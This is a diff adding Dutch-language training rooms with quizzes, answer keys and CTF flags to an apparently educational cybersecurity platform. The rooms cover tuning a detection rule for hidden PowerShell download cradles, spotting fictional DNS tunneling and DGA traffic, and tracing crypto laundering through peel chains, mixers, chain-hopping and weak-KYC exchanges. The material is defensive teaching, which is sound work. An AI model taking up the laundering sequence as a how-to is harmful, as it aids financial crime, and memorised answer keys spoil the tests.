+  { label: 'powershell Get-Service (normaal)', malicious: false, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe Get-Service' } },
+  { label: 'chrome renderer (normaal)', malicious: false, fields: { EventID: '1', Image: 'chrome.exe', CommandLine: 'chrome.exe --type=renderer' } },
+  { label: 'Get-ChildItem -Hidden (legitiem!)', malicious: false, fields: { EventID: '1', Image: 'powershell.exe', CommandLine: 'powershell.exe Get-ChildItem -Hidden C:\\Users\\jan' } },
+  { label: 'cmd dir (normaal)', malicious: false, fields: { EventID: '4688', Image: 'cmd.exe', CommandLine: 'cmd.exe /c dir' } },
+];
+
+CS.registerRoom({
+  id: 'detectie-bouwen',
+  path: 'defensief',
+  order: 6,
+  title: 'Detectie bouwen: van IOC naar regel',
+  icon: '🧰',
+  difficulty: 'Gemiddeld',
+  minutes: 45,
+  summary: 'De praktijkkant van detectie-engineering. Je bouwt zelf een detectieregel uit voorwaarden en test hem live tegen een set events — en leert de kerndilemma\'s voelen: een te brede regel geeft vals-positieven (ruis, alarmmoeheid), een te smalle mist de aanval. Je tunet een naïeve regel tot hij precies alle kwaadaardige events vangt, zonder ruis.',
+  objectives: [
+    'De begrippen true/false positive en false negative uitleggen',
+    'Een detectieregel bouwen uit voorwaarden (field + operator + waarde)',
+    'Het spanningsveld specificiteit (weinig FP) vs. dekking (weinig FN) toepassen',
+    'Een te brede regel tunen tot hij geen vals-positieven meer geeft',
+    'Waarom je detectie bouwt op gedrag, niet alleen op makkelijk te wisselen IOCs',
+  ],
+  terms: [
+    { term: 'Detectie-engineering', def: 'Het ontwerpen, testen en onderhouden van detectieregels die aanvallen zichtbaar maken in logs.' },
+    { term: 'True positive (TP)', def: 'Een terecht alarm: de regel matcht een event dat echt kwaadaardig is.' },
+    { term: 'False positive (FP)', def: 'Een vals alarm: de regel matcht iets onschuldigs. Te veel FP → alarmmoeheid.' },
+    { term: 'False negative (FN)', def: 'Een gemiste aanval: de regel matcht een kwaadaardig event níét.' },
+    { term: 'Specificiteit', def: 'Hoe precies een regel is: hoog = weinig vals-positieven.' },
+    { term: 'Dekking', def: 'Hoeveel van de aanvallen een regel vangt: hoog = weinig gemiste events (FN).' },
+    { term: 'Alarmmoeheid', def: 'Wanneer analisten door te veel vals alarm échte alarmen gaan negeren.' },
+    { term: 'Pyramid of Pain', def: 'Model (David Bianco): detectie op gedrag/TTP\'s doet een aanvaller meer pijn dan detectie op makkelijk te wisselen IOCs (hashes, IP\'s).' },
+  ],
+  resources: [
+    { title: 'SigmaHQ — Sigma-regels en specificatie', url: 'https://github.com/SigmaHQ/sigma' },
+    { title: 'MITRE ATT&CK — Command and Scripting Interpreter: PowerShell (T1059.001)', url: 'https://attack.mitre.org/techniques/T1059/001/' },
+    { title: 'David Bianco — The Pyramid of Pain', url: 'https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html' },
+    { title: 'Microsoft — Sysmon', url: 'https://learn.microsoft.com/sysinternals/downloads/sysmon' },
+  ],
+  tasks: [
+    {
+      title: 'Taak 1 — De taal van detectie: TP, FP en FN',
+      content: `
+        <p>Een detectieregel is een afweging, geen schakelaar. Elke regel verdeelt de wereld in vier vakjes:</p>
+        <ul>
+          <li><strong>True positive (TP)</strong> — terecht alarm (regel matcht echt kwaadaardig event). 🎯</li>
+          <li><strong>False positive (FP)</strong> — vals alarm (regel matcht iets onschuldigs). 🔔 Te veel → <em>alarmmoeheid</em>.</li>
+          <li><strong>False negative (FN)</strong> — gemiste aanval (regel matcht een kwaadaardig event niet). 😱</li>
+          <li><strong>True negative (TN)</strong> — terecht stil (onschuldig event, geen alarm).</li>
+        </ul>
+        <p>Het eeuwige dilemma: maak je de regel <strong>breder</strong> (meer dekking, minder FN) dan krijg je meer
+        <strong>FP</strong>; maak je hem <strong>smaller</strong> (minder FP) dan riskeer je <strong>FN</strong>. Goede
+        detectie vangt álle kwaadaardige events met zo min mogelijk ruis — en bouwt bij voorkeur op <em>gedrag</em>
+        (hoog in de <strong>Pyramid of Pain</strong>) in plaats van op een IP of hash die een aanvaller zo wisselt.</p>
+        <div class="callout warn"><strong>Alles fictief:</strong> de events en IP's zijn verzonnen oefenmateriaal.</div>
+        <div class="callout tip"><strong>Beloning:</strong> alle aanvallen vangen, geen ruis. Vlag: <code>NM{tp_zonder_fp}</code>.</div>
+      `,
+      questions: [
+        { q: 'Wat is een false positive?', options: ['Een vals alarm: de regel matcht iets onschuldigs', 'Een gemiste aanval', 'Een terecht alarm', 'Een uitgeschakelde regel'], answer: 0, explain: 'Een FP is loos alarm; te veel FP leidt tot alarmmoeheid en gemiste echte dreigingen.' },
+        { q: 'Wat gebeurt er als je een regel steeds breder maakt?', options: ['Meer dekking, maar ook meer vals-positieven', 'Minder vals-positieven', 'Gegarandeerd nul alarmen', 'De regel stopt met werken'], answer: 0, explain: 'Breder = je vangt meer, inclusief meer onschuldige dingen (FP). Dat is het kerndilemma.' },
+        { q: 'Waarom is detectie op gedrag beter dan op een los IP of hash?', options: ['Gedrag/TTP\'s zijn moeilijker te wisselen voor een aanvaller (hoger in de Pyramid of Pain)', 'IP\'s zijn geheim', 'Hashes bestaan niet', 'Gedrag is makkelijker te typen'], answer: 0, explain: 'Een aanvaller wisselt een IP of hash zo; zijn techniek/gedrag veranderen kost veel meer moeite.' },
+        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{tp_zonder_fp}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{tp_zonder_fp}.' },
+      ],
+    },
+    {
+      title: 'Taak 2 — Bouw en test je eigen regel',
+      content: `
+        <p>Tijd om het te voelen. Hieronder staan zes events (🟥 = kwaadaardig, 🟩 = onschuldig). Bouw een regel uit
+        voorwaarden (ze worden met <strong>EN</strong> gecombineerd) en test hem live. Je doel: <strong>beide</strong>
+        kwaadaardige PowerShell-commando's vangen, met <strong>geen</strong> vals-positieven.</p>
+        <p>Tip: begin breed en kijk wat er misgaat. Probeer bijvoorbeeld <code>CommandLine bevat hidden</code> — en let op
+        welk onschuldig commando dan óók afgaat. Verfijn daarna.</p>
+        <div class="callout tip"><strong>Beloning:</strong> de perfecte regel onthult de vlag in het lab: <code>NM{regel_op_maat}</code>.</div>
+      `,
+      lab: {
+        type: 'detectrule',
+        title: 'detecteer de PowerShell-aanval',
+        scenario: 'Twee kwaadaardige PowerShell-cradles tussen normaal verkeer. Vang ze beide zonder vals alarm.',
+        fields: ['EventID', 'Image', 'CommandLine'],
+        events: DB_EVENTS,
+        solution: [{ field: 'CommandLine', op: 'bevat', value: '-w hidden' }],
+        flag: 'NM{regel_op_maat}',
+        ask: [
+          { q: 'Hoeveel kwaadaardige events staan er in totaal in de lijst?', answer: ['2', 'twee'], hint: 'Tel de 🟥-events.' },
+          { q: 'Welke voorwaarde-waarde vangt beide zonder vals-positief (vul precies in)?', answer: ['-w hidden', 'w hidden'], hint: 'Niet alleen "hidden" — dat matcht ook het legitieme Get-ChildItem -Hidden.' },
+        ],
+      },
+      questions: [
+        { q: 'Waarom geeft de regel "CommandLine bevat hidden" een vals-positief?', options: ['Omdat het legitieme "Get-ChildItem -Hidden" ook "hidden" bevat', 'Omdat hidden een virus is', 'Omdat PowerShell verboden is', 'Omdat het event ontbreekt'], answer: 0, explain: 'Een onschuldig commando met "-Hidden" matcht ook; de regel is te breed.' },
+        { q: 'Hoe maak je de regel specifiek genoeg?', options: ['Match op "-w hidden" (met de -w ervoor), zodat alleen de cradles afgaan', 'Match op "powershell"', 'Match op EventID 1', 'Verwijder alle voorwaarden'], answer: 0, explain: '"-w hidden" (de verborgen-venster-vlag) zit wel in de aanvallen maar niet in het legitieme Get-ChildItem -Hidden.' },
+        { q: 'Hoeveel kwaadaardige events moet je vangen voor een perfecte score?', answer: ['2', 'twee'], hint: 'Het aantal 🟥-events.', explain: 'Beide kwaadaardige cradles (TP = 2) met FP = 0 is de perfecte regel.' },
+        { q: 'Welke vlag hoort bij de perfecte regel?', answer: ['NM{regel_op_maat}'], hint: 'Verschijnt in het lab bij TP=2, FP=0 / staat in de tip-callout.', explain: 'De vlag is NM{regel_op_maat}.' },
+      ],
+    },
+    {
+      title: 'Taak 3 — Tunen, testen en documenteren',
+      content: `
+        <p>Een regel is nooit "af". Voordat hij live gaat, test je hem tegen <strong>echte</strong> (goede én kwaadaardige)
+        data om de FP-last te meten. Daarna <strong>tune</strong> je: uitzonderingen voor bekende legitieme tools,
+        drempelwaarden, en context. En je <strong>documenteert</strong>: welke ATT&CK-techniek dekt de regel, welke
+        aannames, en wat te doen bij een hit (de "response").</p>
+        <p>De regel die je net bouwde dekt <strong>T1059.001 (PowerShell)</strong>. In Sigma zou je dezelfde logica
+        schrijven als een <code>selection</code> op <code>CommandLine|contains: '-w hidden'</code> — porteerbaar naar elke
+        SIEM.</p>
+        <div class="callout tip"><strong>Beloning:</strong> test vóór je deployt. Vlag: <code>NM{test_voor_je_deployt}</code>.</div>
+      `,
+      questions: [
+        { q: 'Waarom test je een regel tegen echte data voordat hij live gaat?', options: ['Om de vals-positief-last te meten en alarmmoeheid te voorkomen', 'Om de regel sneller te maken', 'Omdat het wettelijk moet', 'Om de SIEM te resetten'], answer: 0, explain: 'Een regel die in productie honderden FP\'s geeft, wordt genegeerd of uitgezet — eerst meten, dan tunen.' },
+        { q: 'Welke ATT&CK-techniek dekt de PowerShell-regel uit taak 2?', options: ['T1059.001 — Command and Scripting Interpreter: PowerShell', 'T1566 — Phishing', 'T1486 — Data Encrypted for Impact', 'T1110 — Brute Force'], answer: 0, explain: 'Kwaadaardige PowerShell-uitvoering valt onder T1059.001; je documenteert die dekking bij de regel.' },
+        { q: 'Wat hoort nog meer bij een goede regel, naast de match-logica?', options: ['Documentatie: dekking (ATT&CK), aannames en wat te doen bij een hit', 'Alleen de titel', 'Een wachtwoord', 'Niets'], answer: 0, explain: 'Een regel zonder response-instructie en context laat de analist in het ongewisse; documenteer het.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{test_voor_je_deployt}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{test_voor_je_deployt}.' },
+      ],
+    },
   ],
 });
 
@@ -21860,6 +22299,482 @@ CS.registerRoom({
 
 </script>
 <script>
+/* Room: Datastromen — DNS als stille uitgang (tunneling & DGA) */
+
+// =======================================================================
+//  Alles FICTIEF: .nm.lab-domeinen en verzonnen queries. Je oefent het
+//  lezen van DNS-verkeer, je bevraagt geen echte naamservers.
+// =======================================================================
+
+const DNS_QUERIES = [
+  { time: '02:10:01', name: 'intranet.nm.lab', type: 'A', resp: 'OK' },
+  { time: '02:10:03', name: 'mail.nm.lab', type: 'A', resp: 'OK' },
+  { time: '02:11:00', name: 'k5euo63fmjtv64lomfptgmt5aib7q.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:11:02', name: 'nf4xq1k9plm2wdr3nxc8vbp7za9qm.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:11:05', name: 'w1sbt4ydxd9ko5x2tcu5zeye1lp6ab.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:11:07', name: 'v7qra3xswc8ij4m4p8r2wd9cq7m2v8.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:11:10', name: 'p0r3n4c8vbk5euo63fmjtv64lomfpt.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:11:12', name: 'z9qm2wdr3nxc8vbp7za9k9plm2wdxd.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:11:15', name: 'aegh5t7qk5euo63fmjtv64lomfptgm.exfil.nm.lab', type: 'TXT', resp: 'OK' },
+  { time: '02:12:00', name: 'updates.nm.lab', type: 'A', resp: 'OK' },
+  { time: '02:12:30', name: 'xk3f9q2v8.nm.lab', type: 'A', resp: 'NXDOMAIN' },
+  { time: '02:12:31', name: 'p7m2v8z1a.nm.lab', type: 'A', resp: 'NXDOMAIN' },
+  { time: '02:12:33', name: 'w1sbt4yd0.nm.lab', type: 'A', resp: 'NXDOMAIN' },
+  { time: '02:12:35', name: 'r3nxc8vb2.nm.lab', type: 'A', resp: 'NXDOMAIN' },
+  { time: '02:12:37', name: 'm4p8r2wd9.nm.lab', type: 'A', resp: 'NXDOMAIN' },
+  { time: '02:12:39', name: 'v7qra3xs1.nm.lab', type: 'A', resp: 'NXDOMAIN' },
+  { time: '02:13:00', name: 'mail.nm.lab', type: 'A', resp: 'OK' },
+];
+
+CS.registerRoom({
+  id: 'dns-datastromen',
+  path: 'datastromen',
+  order: 4,
+  title: 'DNS: de stille uitgang',
+  icon: '🌫️',
+  difficulty: 'Gemiddeld',
+  minutes: 45,
+  summary: 'DNS mag bijna overal naar buiten — en juist daarom misbruiken aanvallers het als geheim kanaal. Je leert DNS-tunneling (data wegsmokkelen in lange subdomeinen, vaak TXT) onderscheiden van een DGA (malware die willekeurige domeinen aftast om zijn C2 te vinden), en hoe je beide detecteert en blokkeert.',
+  objectives: [
+    'Uitleggen waarom DNS een aantrekkelijk covert channel is',
+    'DNS-tunneling herkennen aan veel TXT-queries met lange, hoog-entropische subdomeinen naar één domein',
+    'Een DGA herkennen aan veel willekeurige domeinen met NXDOMAIN-antwoorden',
+    'Een DNS-querylog lezen en de verdachte stromen aanwijzen',
+    'Detectie- en blokkeermaatregelen benoemen (NXDOMAIN-ratio, RPZ/sinkhole, lengte/entropie)',
+  ],
+  terms: [
+    { term: 'DNS', def: 'Domain Name System: vertaalt namen (example.com) naar IP-adressen. Vrijwel elk netwerk laat DNS naar buiten.' },
+    { term: 'Covert channel', def: 'Een verborgen communicatiekanaal via een protocol dat voor iets anders bedoeld is — zoals data in DNS-queries.' },
+    { term: 'DNS-tunneling', def: 'Data (of C2-verkeer) verstoppen in DNS: de payload gaat als lange, gecodeerde subdomeinen naar een domein dat de aanvaller beheert; antwoorden komen vaak in TXT-records.' },
+    { term: 'TXT-record', def: 'Een DNS-record dat vrije tekst kan bevatten; populair bij tunneling omdat er veel data in past.' },
+    { term: 'DGA', def: 'Domain Generation Algorithm: malware genereert dagelijks veel willekeurige domeinnamen en probeert ze één voor één; de meeste bestaan niet (NXDOMAIN) tot het de actieve C2 raakt.' },
+    { term: 'NXDOMAIN', def: 'Het DNS-antwoord "dit domein bestaat niet". Een plotselinge piek aan NXDOMAIN is een klassiek DGA-signaal.' },
+    { term: 'Entropie', def: 'Maat voor willekeur. Hoog-entropische (random ogende) subdomeinen wijzen op gegenereerde of gecodeerde namen, niet op menselijk gekozen woorden.' },
+    { term: 'RPZ / sinkhole', def: 'Response Policy Zone of DNS-sinkhole: kwaadaardige domeinen op de resolver blokkeren of omleiden naar een onschadelijk adres.' },
+  ],
+  resources: [
+    { title: 'MITRE ATT&CK — Exfiltration Over Alternative Protocol (T1048)', url: 'https://attack.mitre.org/techniques/T1048/' },
+    { title: 'MITRE ATT&CK — Dynamic Resolution: DGA (T1568.002)', url: 'https://attack.mitre.org/techniques/T1568/002/' },
+    { title: 'SANS — Detecting DNS tunneling', url: 'https://www.sans.org/white-papers/' },
+    { title: 'NCSC — Nationaal Cyber Security Centrum', url: 'https://www.ncsc.nl/' },
+  ],
+  tasks: [
+    {
+      title: 'Taak 1 — Waarom DNS de perfecte sluiproute is',
+      content: `
+        <p>Een firewall blokkeert van alles, maar <strong>DNS</strong> mag bijna altijd naar buiten — anders werkt het
+        internet niet. Precies daarom is DNS geliefd bij aanvallers als <strong>covert channel</strong>: een verborgen
+        kanaal via een protocol dat eigenlijk voor iets anders bedoeld is.</p>
+        <p>Er zijn twee misbruikvormen die je moet kunnen herkennen:</p>
+        <ul>
+          <li><strong>DNS-tunneling</strong> — data wegsmokkelen in de <em>subdomeinen</em> van een domein dat de aanvaller
+          beheert. Het slachtoffer vraagt bijvoorbeeld <code>k5euo63fmjtv64lo….exfil.nm.lab</code> op; de "vraag" ís de data.
+          Antwoorden komen vaak in <strong>TXT</strong>-records.</li>
+          <li><strong>DGA</strong> (domain generation algorithm) — malware verzint dagelijks veel <em>willekeurige</em>
+          domeinnamen en probeert ze af te tasten om zijn C2 te vinden. De meeste bestaan niet, dus je ziet een piek aan
+          <strong>NXDOMAIN</strong>.</li>
+        </ul>
+        <div class="callout warn"><strong>Alles fictief:</strong> de domeinen eindigen op <code>.nm.lab</code> en de queries
+        zijn verzonnen. Je oefent het lezen van DNS-verkeer.</div>
+        <div class="callout tip"><strong>Beloning:</strong> DNS mag naar buiten, dus wordt het misbruikt. Vlag:
+        <code>NM{dns_mag_naar_buiten}</code>.</div>
+      `,
+      questions: [
+        { q: 'Waarom is DNS een aantrekkelijk kanaal voor aanvallers?', options: ['Het mag bijna overal naar buiten, ook waar andere protocollen geblokkeerd zijn', 'Het is versleuteld', 'Het is sneller dan HTTPS', 'Het wordt nooit gelogd'], answer: 0, explain: 'DNS is zo fundamenteel dat het bijna altijd door de firewall mag — ideaal als sluiproute.' },
+        { q: 'Hoe smokkelt DNS-tunneling data naar buiten?', options: ['In lange, gecodeerde subdomeinen naar een domein van de aanvaller', 'Door het IP-adres te veranderen', 'Door de firewall uit te zetten', 'Via e-mailbijlagen'], answer: 0, explain: 'De data zit in de query zelf (de subdomeinen); de resolver stuurt die netjes naar de kwaadaardige naamserver.' },
+        { q: 'Wat is het klassieke signaal van een DGA?', options: ['Een piek aan NXDOMAIN-antwoorden op willekeurige domeinen', 'Veel TXT-records', 'Een enkele grote download', 'Lage jitter'], answer: 0, explain: 'Een DGA raakt veel niet-bestaande domeinen: de NXDOMAIN-ratio schiet omhoog tot het de actieve C2 vindt.' },
+        { q: 'Welke vlag staat in de tip-callout?', answer: ['NM{dns_mag_naar_buiten}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{dns_mag_naar_buiten}.' },
+      ],
+    },
+    {
+      title: 'Taak 2 — Lees het DNS-querylog',
+      content: `
+        <p>Hieronder staat een stukje DNS-querylog van één werkplek. Twee dingen zijn mis. Zoek het
+        <strong>tunneling-domein</strong> (veel TXT-queries met lange, willekeurige subdomeinen naar één domein) en herken
+        het <strong>DGA</strong>-patroon (een reeks willekeurige domeinen met NXDOMAIN). Laat je niet afleiden door het
+        normale verkeer naar intranet, mail en updates.</p>
+        <div class="callout tip"><strong>Beloning:</strong> betrap de stille uitgang. Vlag: <code>NM{stille_uitgang_betrapt}</code>.</div>
+      `,
+      lab: {
+        type: 'dnslog',
+        title: 'DNS-queries van werkplek WRK-23',
+        scenario: 'Eén domein slurpt data via TXT; een reeks willekeurige namen botst op NXDOMAIN. Welke is welke?',
+        queries: DNS_QUERIES,
+        ask: [
+          { q: 'Welk domein is het DNS-tunneling-kanaal?', answer: ['exfil.nm.lab'], hint: 'Veel TXT-queries met lange subdomeinen naar hetzelfde domein.' },
+          { q: 'Welk DNS-recordtype gebruikt dat kanaal om data te verbergen?', answer: ['TXT', 'txt'], hint: 'Kijk naar de typekolom bij de verdachte queries.' },
+          { q: 'Hoeveel queries kregen NXDOMAIN (teken van een DGA)?', answer: ['6', 'zes'], hint: 'Lees de regel onder de samenvatting.' },
+        ],
+      },
+      questions: [
+        { q: 'Welk domein wordt gebruikt voor DNS-tunneling?', answer: ['exfil.nm.lab'], hint: 'Veel TXT + lange subdomeinen naar één domein.', explain: 'exfil.nm.lab kreeg zeven TXT-queries met lange, hoog-entropische subdomeinen — klassieke tunneling.' },
+        { q: 'Waaraan herken je de tunneling in het log?', options: ['Veel TXT-queries met lange, willekeurige subdomeinen naar hetzelfde domein', 'Veel NXDOMAIN', 'Eén grote download', 'A-records naar intranet'], answer: 0, explain: 'De combinatie lange subdomeinen + TXT + steeds hetzelfde domein verraadt het tunneling-kanaal.' },
+        { q: 'Hoeveel queries kregen een NXDOMAIN-antwoord?', answer: ['6', 'zes'], hint: 'De samenvatting onderaan het lab.', explain: 'Zes willekeurige domeinen gaven NXDOMAIN — het DGA tast domeinen af op zoek naar de C2.' },
+        { q: 'Welke stroom is juist normaal verkeer?', options: ['De A-queries naar intranet.nm.lab, mail.nm.lab en updates.nm.lab (die resolven netjes)', 'De TXT-queries naar exfil.nm.lab', 'De NXDOMAIN-reeks', 'Alle .nm.lab-queries zijn kwaadaardig'], answer: 0, explain: 'Korte, bekende namen die netjes resolven (OK) zijn gewoon normaal gebruik.' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{stille_uitgang_betrapt}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{stille_uitgang_betrapt}.' },
+      ],
+    },
+    {
+      title: 'Taak 3 — Detecteren en blokkeren',
+      content: `
+        <p>Nu je het patroon kent, hoe vang je het structureel? DNS-misbruik detecteer je niet aan één query, maar aan
+        <strong>patronen over tijd</strong>:</p>
+        <ul>
+          <li><strong>Lengte &amp; entropie</strong> van subdomeinen — meet hoe lang en hoe willekeurig ze zijn (tunneling
+          valt op).</li>
+          <li><strong>Volume per domein</strong> — veel queries naar één zelden-bezocht domein is verdacht.</li>
+          <li><strong>NXDOMAIN-ratio</strong> — een plotselinge piek wijst op een DGA.</li>
+          <li><strong>Recordtypes</strong> — ongewoon veel TXT (of NULL) is een rode vlag.</li>
+        </ul>
+        <p>Blokkeren doe je op de resolver met een <strong>RPZ</strong> of <strong>sinkhole</strong>: je weigert het
+        kwaadaardige domein of leidt het om naar een onschadelijk adres, zodat je besmette machines ook meteen ziet.</p>
+        <div class="callout tip"><strong>Beloning:</strong> meet patronen, niet losse queries. Vlag: <code>NM{meet_de_patronen}</code>.</div>
+      `,
+      questions: [
+        { q: 'Welke maat helpt het best om DNS-tunneling te detecteren?', options: ['Lengte en entropie van de subdomeinen', 'De kleur van het domein', 'Het aantal letters in de TLD', 'De tijd van de dag'], answer: 0, explain: 'Tunneling-subdomeinen zijn lang en willekeurig; lengte/entropie meten vangt ze automatisch.' },
+        { q: 'Een plotselinge piek in de NXDOMAIN-ratio wijst vooral op…', options: ['Een DGA die domeinen aftast op zoek naar zijn C2', 'Normaal browsen', 'Een software-update', 'Een trage resolver'], answer: 0, explain: 'Veel mislukte lookups op willekeurige namen is het handtekeningpatroon van een DGA.' },
+        { q: 'Hoe blokkeer je een kwaadaardig DNS-domein op de resolver?', options: ['Met een RPZ of sinkhole (weigeren of omleiden naar een onschadelijk adres)', 'Door de werkplek uit te zetten', 'Door DNS helemaal te blokkeren', 'Door het wachtwoord te wijzigen'], answer: 0, explain: 'Een RPZ/sinkhole blokkeert het domein centraal én onthult welke machines het nog proberen (besmet).' },
+        { q: 'Welke vlag staat in de tip-callout van deze taak?', answer: ['NM{meet_de_patronen}'], hint: 'Lees de tip-callout.', explain: 'De vlag is NM{meet_de_patronen}.' },
+      ],
+    },
+  ],
+});
+
+</script>
+<script>
+/* Room: Datastromen — crypto-witwassen: peel chains, chain-hopping & stablecoins */
+
+// =======================================================================
+//  Alles FICTIEF: verzonnen wallets, bedragen en diensten. Je oefent de
+//  denkwijze; je volgt geen echte transacties of personen.
+// =======================================================================
+
+// --- Chaintrace: een peel chain (splitsen reinigt NIET) ---
+const CW_LABELS = { D: 'Losgeld-wallet (vuil)', A: 'Rest-wallet 1', B: 'Rest-wallet 2', C1: 'Afgepelde cash-out 1', C2: 'Afgepelde cash-out 2', EX: 'Exchange (cash-out)' };
+const CW_ORIGINS = [{ addr: 'D', amount: 10 }];
+const CW_TXS = [
+  { inputs: ['D'], outputs: [{ addr: 'A', amount: 9 }, { addr: 'C1', amount: 1 }], time: '10:00' },
+  { inputs: ['A'], outputs: [{ addr: 'B', amount: 8 }, { addr: 'C2', amount: 1 }], time: '10:30' },
+  { inputs: ['B'], outputs: [{ addr: 'EX', amount: 8 }], time: '11:00' },
+];
+
+// --- Flow: chain-hopping over ketens en een stablecoin ---
+const CW_NODES = [
+  { id: 'rw', type: 'wallet', label: 'Vuile BTC-wallet' },
+  { id: 'mix', type: 'mixer', label: "Mixer 'CoinWas'" },
+  { id: 'swap', type: 'service', label: 'Swap BTC → ETH (bridge)' },
+  { id: 'stab', type: 'service', label: 'Omzetting naar USDT (stablecoin)' },
+  { id: 'ex', type: 'exchange', label: 'Exchange met zwakke KYC (cash-out)' },
+];
+const CW_EDGES = [
+  { from: 'rw', to: 'mix', amount: 100000, time: 'dag 1', note: 'waarde ±€ 100.000 de mixer in' },
+  { from: 'mix', to: 'swap', amount: 97000, time: 'dag 1', note: 'mixer houdt €3.000' },
+  { from: 'swap', to: 'stab', amount: 95000, time: 'dag 2', note: 'swap naar ETH, €2.000 kosten/slippage' },
+  { from: 'stab', to: 'ex', amount: 94000, time: 'dag 3', note: 'omgezet in USDT (koersrisico weg), €1.000 kosten' },
+];
+
+// --- Ordering: de stappen van crypto-witwassen ---
+const CW_STEPS = [
+  { id: '1', label: 'Losgeld komt binnen op een wallet (placement)' },
+  { id: '2', label: 'Het bedrag wordt via een peel chain opgeknipt (layering)' },
+  { id: '3', label: 'De munten gaan door een mixer/CoinJoin om de link te verbergen' },
+  { id: '4', label: 'Chain-hopping: swappen naar een andere blockchain (BTC → ETH)' },
+  { id: '5', label: 'Omzetten in een stablecoin (USDT) om koersrisico te vermijden' },
+  { id: '6', label: 'Cash-out bij een exchange met zwakke KYC' },
+];
+
+CS.registerRoom({
+  id: 'crypto-witwassen',
+  path: 'datastromen',
+  order: 5,
+  title: 'Crypto-witwassen: peel chains & chain-hopping',
+  icon: '🪙',
+  difficulty: 'Moeilijk',
+  minutes: 60,
+  summary: 'Een verdieping op het volgen van cryptostromen. Je leert waarom opknippen (peeling) de taint níét wegneemt, hoe chain-hopping en stablecoins het spoor versluieren, wat NFT-wash-trading is, en waar de off-ramp (exchange) het knelpunt blijft. Met de blockchain-tracer, een stroomanalyse en de witwas-volgorde.',
+  objectives: [
+    'Uitleggen waarom een peel chain de taint niet verlaagt (splitsen ≠ reinigen)',
+    'Het verschil kennen tussen verdunnen (mixer + schoon geld) en versluieren (peeling/hopping)',
+    'Chain-hopping en de rol van stablecoins in witwassen herkennen',
+    'NFT-wash-trading als integratietruc uitleggen',
+    'De off-ramp (exchange, KYC) als het beslissende knelpunt aanwijzen',
+  ],
+  terms: [
+    { term: 'Peel chain', def: 'Een keten waarin telkens een klein bedrag wordt "afgepeld" naar een cash-out, terwijl de rest doorreist — om in stukjes uit te betalen zonder op te vallen.' },
+    { term: 'Taint', def: 'De mate waarin het geld op een adres uit een vuile bron komt (als bedrag en percentage). Peeling splitst de taint, maar laat hem niet verdwijnen.' },
+    { term: 'Mixer / CoinJoin', def: 'Dienst of techniek die munten van velen vermengt om de directe link tussen in- en uitgang te breken.' },
+    { term: 'Chain-hopping', def: 'Waarde van de ene blockchain naar de andere verplaatsen (bijv. BTC → ETH via een bridge) om het spoor over ketens te verbreken.' },
+    { term: 'Stablecoin', def: 'Een cryptomunt gekoppeld aan een valuta (bijv. USDT ↔ dollar). Witwassers gebruiken het om koersrisico te vermijden terwijl ze "geparkeerd" staan.' },
+    { term: 'NFT-wash-trading', def: 'Een NFT aan jezelf verkopen voor een hoog bedrag om nepomzet/legitieme "winst" te creëren — een integratietruc.' },
+    { term: 'Off-ramp / cash-out', def: 'De plek waar crypto naar gewoon geld gaat (exchange, pinautomaat). Door KYC/Wwft hangt daar een echte identiteit aan het spoor.' },
+    { term: 'KYC', def: 'Know Your Customer: identiteitscontrole bij een exchange. Zwakke KYC maakt een exchange aantrekkelijk voor cash-out.' },
+  ],
+  resources: [
+    { title: 'Chainalysis — Crypto Crime Report', url: 'https://www.chainalysis.com/' },
+    { title: 'Elliptic — crypto-forensics', url: 'https://www.elliptic.co/' },
+    { title: 'FATF — Virtual Assets', url: 'https://www.fatf-gafi.org/en/topics/virtual-assets.html' },
+    { title: 'Bitcoin-wiki — CoinJoin', url: 'https://en.bitcoin.it/wiki/CoinJoin' },
+  ],
+  tasks: [
+    {
+      title: 'Taak 1 — Peeling: splitsen reinigt niet',
+      content: `
+        <p>Een hardnekkig misverstand: als je crimineel geld in heel veel kleine stukjes opknipt, zou het "schoner"
+        worden. Niet waar. Een <strong>peel chain</strong> pelt telkens een klein bedrag af naar een cash-out terwijl de
+        rest doorreist — handig om onopvallend uit te betalen, maar de <strong>taint</strong> blijft 100%: je verdeelt het
+        vuil, je laat het niet verdwijnen.</p>
+        <p>Alleen <em>mengen met schoon geld</em> (een mixer met echte liquiditeit, of een CoinJoin) verlaagt het
+        <em>percentage</em> — en zelfs dan blijft het vuile <em>bedrag</em> bestaan. Reken het na met de tracer.</p>
+        <div class="callout warn"><strong>Alles fictief:</strong> de wallets, bedragen en diensten zijn verzonnen.</div>
+        <div class="callout tip"><strong>Beloning:</strong> peeling splitst, het reinigt niet. Vlag: <code>NM{peelen_is_niet_reinigen}</code>.</div>
+      `,
+      lab: {
+        type: 'chaintrace',
+        title: 'de peel chain',
+        unit: 'BTC',
+        scenario: '10 BTC losgeld wordt in stapjes afgepeld. Blijft het vuil?',
+        labels: CW_LABELS,
+        exchanges: ['EX'],
+        origins: CW_ORIGINS,
+        txs: CW_TXS,
+        ask: [
+          { q: 'Hoeveel vuil geld (BTC) bereikt de exchange?', answer: ['8', '8.0', '8 btc'], hint: 'Lees de taint-kolom bij de exchange.' },
+          { q: 'Wat is het taint-percentage op de exchange na het peelen? (in %)', answer: ['100%', '100', '100 %'], hint: 'Er kwam nergens schoon geld bij.' },
+        ],
+      },
+      questions: [
+        { q: 'Wat doet een peel chain met de taint?', options: ['Niets aan het percentage: het vuil wordt alleen opgesplitst, niet verwijderd', 'Het verlaagt de taint naar 0%', 'Het verdubbelt de taint', 'Het wist de blockchain'], answer: 0, explain: 'Splitsen verdeelt het vuile bedrag; zonder schoon geld blijft elk deel 100% vuil.' },
